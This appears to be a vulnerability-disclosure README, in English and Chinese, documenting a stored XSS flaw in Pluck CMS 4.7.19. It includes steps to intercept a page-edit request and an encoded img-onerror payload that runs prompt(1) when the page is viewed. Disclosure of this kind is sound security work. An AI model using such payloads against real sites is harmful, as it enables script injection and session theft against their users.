# pluck-cms-record
Record a storage type XSS vulnerability caused by a CMS

Through the official website https://github.com/pluck-cms/pluck/releases/tag/4.7.19
Deploy and install plug cms 4.7.19

访问路径 http://127.0.0.1/pub19/admin.php?action=editpage
<img width="834" alt="3" src="https://github.com/user-attachments/assets/79b3d568-48e4-4474-8688-60878e27217f" />
填写参数 test55
<img width="792" alt="4" src="https://github.com/user-attachments/assets/4c75c1bc-0f33-4e58-8a4c-8e184627e349" />

点击提交，进行抓包
<img width="845" alt="6" src="https://github.com/user-attachments/assets/7adc2d65-2cff-46b7-810d-78745cb2dbab" />
修改content 字段
payload:  %3Cp%3E1111111"><ImG sRc=1 OnErRoR=prompt(1)>%3Cbr%2F%3E%3C%2Fp%3E
<img width="947" alt="7" src="https://github.com/user-attachments/assets/84067b42-0a06-47ed-873c-3d8c1214a29d" />
放包后自动跳转：
<img width="892" alt="8" src="https://github.com/user-attachments/assets/5314b0ff-9f46-4fcd-91db-5205a26b8e67" />
点击刚刚提交的test55,触发xss

<img width="1028" alt="9" src="https://github.com/user-attachments/assets/d8cf90a5-4499-475c-9918-128a17dd2315" />





